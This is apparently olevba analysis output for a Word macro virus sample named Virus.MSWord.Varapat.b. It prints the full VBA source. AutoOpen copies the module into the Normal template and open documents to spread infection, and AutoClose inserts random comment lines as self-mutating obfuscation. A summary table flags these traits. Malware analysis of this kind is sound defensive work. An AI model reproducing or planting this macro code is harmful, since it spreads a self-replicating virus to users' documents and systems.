olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Varapat.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Varapat.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Vrika.bas 
in file: Virus.MSWord.Varapat.b - OLE stream: 'Macros/VBA/Vrika'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
ActiveDocument.VBProject.VBComponents.Item("Vrika").Export "c:\Vrika.sys"
With NormalTemplate.VBProject
With .VBComponents.Import("c:\Vrika.sys")
End With
End With
NormalTemplate.VBProject.VBComponents.Item("Vrika").Export "c:\Vrika.sys"
With ActiveDocument.VBProject
With .VBComponents.Import("c:\Vrika.sys")
End With
End With
    ' 3wtzlEiz80_"?_**;DS<;i<BElEb\Ev[O5UdJr:]q:B";yeUW9Nhn)Q[c]Pativara
End Sub
Sub AutoClose()
On Error Resume Next
Rere = Int(Rnd() * 24 + 1)
    ' 3w&&hCJ++0%aPS4KddDrd(Za"GE9yi_Fc9AHv+[@*1'GwQMx4CD:N-OwSr\H_&e`M.5>g%Oei>xi]roF,[c]Pativara
For Rryp = 1 To Rere
Ruru = Application.VBE.ActiveVBProject.VBComponents("Vrika").CodeModule.CountOfLines
Rara = Int(Rnd(44) * Ruru + 12)
    ' a\fe<kaq5ARA3UY-&ZlZG1MxfC[c]Pativara
Roro = Int(Rnd(150) * 100 + 1)
For Ron = 1 To Roro
Rro = Rro + Chr(Int((122 - 33 + 1) * Rnd + 33))
    ' OUJ#B-[.2B)X`HF?`4$p$Jcdk3KokEJ@7iQQY(`8&9w>[AB>44GX6^VW(%.7DU:lqPC!7/[y=6p,TWW_m)Dk9^DlGl4bq4ywoP[c]Pativara
Next Ron
    ' I_MEvyVP[c]Pativara
    ' =WOV>r[c]Pativara
    ' >Y31U(Jr8gC;sYYG)S_sl#QsG^NOJ@E9&6y&DAM/K8YQ/u[ND*gJdVk"3'*>,!Q\Qk(2^IA.[c]Pativara
Application.VBE.ActiveVBProject.VBComponents("Vrika").CodeModule.InsertLines Rara, vbTab & "' " & Rro & "[c]Pativara"
    ' ]$[q?+GfAFdHaN0:(y:X<m=h0<'MIV#=->eYwkRW2r=WVfa^e8RNS:F[c]Pativara
    ' flC2>F.X)3_N1zK!G:dqj0*!.B1yoUb.8#kgh>IRiS33AT?PGT[c]Pativara
Rro = ""
Next Rryp
    ' ;<f"ej`%FnhBwo&vAPf%VK;Y[8:kkVyr5_y6Q*z]"T**h:%;C<vyE://[E[c]Pativara
End Sub
    ' 1:".FRSg$[c]Pativara
    ' /ZXmB%N%BI;x"[XP#a=y;A=@6V`9TTzt7ifEYMM,x0V^*[[c]Pativara


    ' P)eEJM3>)V0t)H9od9]8)#>h;6L7?%L3nUdt>Q(ZEw+tX@.L4z,#@RtQEmk]az?MF_1GQjQGN5XM^pB<;.P5UAoL2^dXg[c]Pativara
    ' _E"0/NE*9ZmM1qB>f4I6pWBDnUtO>o881@!cl:`EjcH(E?`=h.Vw6u+yYVrT7n'He7CDP9U3(q+[r5vm[c]Pativara
    ' G(MT&F+.=zW9FK&JHv90N?OD8'ZARpGVC&*..e8-$_mOiyP'Y>:^EC3o.EWRb,>!gs;5v2FA>yUP-q#[c]Pativara
    ' Gb/&6ev@^h$hL3Wrv["\w!v';Ui$%S=FNcI>'ETeU[iFha_b2f'7vj416t[c]Pativara
    ' 6uKbD5WRJ[e&/*%Rw5@qL5m',wlkz6\YxF&p/7WAPsRweEeTI%$AFAY1H/x9&i`7hoy9JstN[c]Pativara
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

